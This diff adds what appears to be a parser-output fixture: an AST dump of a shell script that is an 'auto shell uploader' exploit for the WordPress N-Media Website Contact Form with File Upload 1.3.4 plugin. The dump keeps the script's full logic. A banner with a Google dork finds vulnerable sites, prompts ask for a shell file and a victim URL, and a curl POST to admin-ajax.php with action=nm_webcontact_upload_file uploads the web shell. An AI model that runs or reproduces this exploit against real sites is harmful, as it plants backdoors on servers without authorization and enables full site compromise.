@@ -1,0 +1,86 @@
+CommandNode(lineno=14, pos=(668, 669), parts=[
+  WordNode(lineno=14, pos=(668, 669), word='\r'),
+])
+CommandNode(lineno=15, pos=(670, 671), parts=[
+  WordNode(lineno=15, pos=(670, 671), word='\r'),
+])
+CommandNode(lineno=16, pos=(672, 1692), parts=[
+  WordNode(lineno=16, pos=(672, 676), word='echo'),
+  WordNode(lineno=16, pos=(677, 1692), word='\r\n+---------------------------------------------------------------+\r\n|                                                               |\r\n| Wordpress N-Media Website Contact Form with File Upload 1.3.4 |\r\n|                                                               |\r\n+---------------------------------------------------------------+\r\n|                                                               |\r\n|\tScript by\t   : F17.c0de                           |\r\n|\tVuln Discovered by : Claudio Viviani                    |\r\n|\tDate\t\t   : 15.04.2015                         |\r\n|\tGoogle Dork\t   : inurl:/uploads/contact_files/    |\r\n|\tVulnerability\t   : upload_file() on admin-ajax.php  |\r\n|\tDescription\t   : Auto shell uploader                |\r\n|                                                               |\r\n+---------------------------------------------------------------+\r\n|                       No System is Safe                       |\r\n+---------------------------------------------------------------+\r\n\r'),
+])
+CommandNode(lineno=17, pos=(1693, 1694), parts=[
+  WordNode(lineno=17, pos=(1693, 1694), word='\r'),
+])
+CommandNode(lineno=18, pos=(1695, 1729), parts=[
+  WordNode(lineno=18, pos=(1695, 1699), word='echo'),
+  WordNode(lineno=18, pos=(1700, 1702), word='-n'),
+  WordNode(lineno=18, pos=(1703, 1705), word='-e'),
+  WordNode(lineno=18, pos=(1706, 1729), word='Path of your shell: \r'),
+])
+CommandNode(lineno=19, pos=(1730, 1738), parts=[
+  WordNode(lineno=19, pos=(1730, 1734), word='read'),
+  WordNode(lineno=19, pos=(1735, 1738), word='bd\r'),
+])
+CommandNode(lineno=20, pos=(1739, 1797), parts=[
+  WordNode(lineno=20, pos=(1739, 1743), word='echo'),
+  WordNode(lineno=20, pos=(1744, 1746), word='-n'),
+  WordNode(lineno=20, pos=(1747, 1749), word='-e'),
+  WordNode(lineno=20, pos=(1750, 1797), word='Victim address [ex: http://www.victim.com]: \r'),
+])
+CommandNode(lineno=21, pos=(1798, 1806), parts=[
+  WordNode(lineno=21, pos=(1798, 1802), word='read'),
+  WordNode(lineno=21, pos=(1803, 1806), word='st\r'),
+])
+CommandNode(lineno=22, pos=(1807, 1815), parts=[
+  WordNode(lineno=22, pos=(1807, 1812), word='sleep'),
+  WordNode(lineno=22, pos=(1813, 1815), word='1\r'),
+])
+CommandNode(lineno=23, pos=(1816, 1821), parts=[
+  WordNode(lineno=23, pos=(1816, 1821), word='echo\r'),
+])
+CommandNode(lineno=24, pos=(1822, 1850), parts=[
+  WordNode(lineno=24, pos=(1822, 1826), word='echo'),
+  WordNode(lineno=24, pos=(1827, 1850), word='Uploading Shell. . .\r'),
+])
+CommandNode(lineno=25, pos=(1851, 1856), parts=[
+  WordNode(lineno=25, pos=(1851, 1856), word='echo\r'),
+])
+CommandNode(lineno=26, pos=(1857, 1858), parts=[
+  WordNode(lineno=26, pos=(1857, 1858), word='\r'),
+])
+CommandNode(lineno=27, pos=(1859, 1981), parts=[
+  WordNode(lineno=27, pos=(1859, 1863), word='curl'),
+  WordNode(lineno=27, pos=(1864, 1866), word='-k'),
+  WordNode(lineno=27, pos=(1867, 1869), word='-X'),
+  WordNode(lineno=27, pos=(1870, 1874), word='POST'),
+  WordNode(lineno=27, pos=(1875, 1877), word='-F'),
+  WordNode(lineno=27, pos=(1878, 1893), word='action=upload'),
+  WordNode(lineno=27, pos=(1894, 1896), word='-F'),
+  WordNode(lineno=27, pos=(1897, 1914), word='Filedata=@./$bd', parts=[
+    ParameterNode(lineno=27, pos=(1910, 1913), value='bd'),
+  ]),
+  WordNode(lineno=27, pos=(1915, 1917), word='-F'),
+  WordNode(lineno=27, pos=(1918, 1952), word='action=nm_webcontact_upload_file'),
+  WordNode(lineno=27, pos=(1953, 1981), word='$st/wp-admin/admin-ajax.php\r', parts=[
+    ParameterNode(lineno=27, pos=(1953, 1956), value='st'),
+  ]),
+])
+CommandNode(lineno=28, pos=(1982, 1983), parts=[
+  WordNode(lineno=28, pos=(1982, 1983), word='\r'),
+])
+CommandNode(lineno=29, pos=(1984, 1989), parts=[
+  WordNode(lineno=29, pos=(1984, 1989), word='echo\r'),
+])
+CommandNode(lineno=30, pos=(1990, 1995), parts=[
+  WordNode(lineno=30, pos=(1990, 1995), word='echo\r'),
+])
+CommandNode(lineno=31, pos=(1996, 2016), parts=[
+  WordNode(lineno=31, pos=(1996, 2000), word='echo'),
+  WordNode(lineno=31, pos=(2001, 2016), word='Job Finished\r'),
+])
+CommandNode(lineno=32, pos=(2017, 2022), parts=[
+  WordNode(lineno=32, pos=(2017, 2022), word='echo\r'),
+])
+CommandNode(lineno=33, pos=(2023, 2024), parts=[
+  WordNode(lineno=33, pos=(2023, 2024), word='\r'),
+])
